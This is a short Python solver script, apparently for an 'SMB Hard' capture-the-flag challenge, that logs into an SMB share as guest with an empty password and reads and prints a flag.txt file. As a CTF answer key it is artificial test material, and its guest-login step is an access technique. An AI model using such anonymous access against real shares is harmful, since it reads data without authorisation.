# Solver script for the SMB Hard Difficulty CTF Challenge
import smbclient

smbclient.ClientConfig(username='guest', password='')

# Connect to the SMB share
with smbclient.open_file('\\\smb-hard-ctf-20231205-140000\CTF\flag.txt', mode='r') as file:
    flag = file.read()
    if 'CTF{' in flag:
        print(f'Flag found: {flag}')
    else:
        print('Flag not found!')
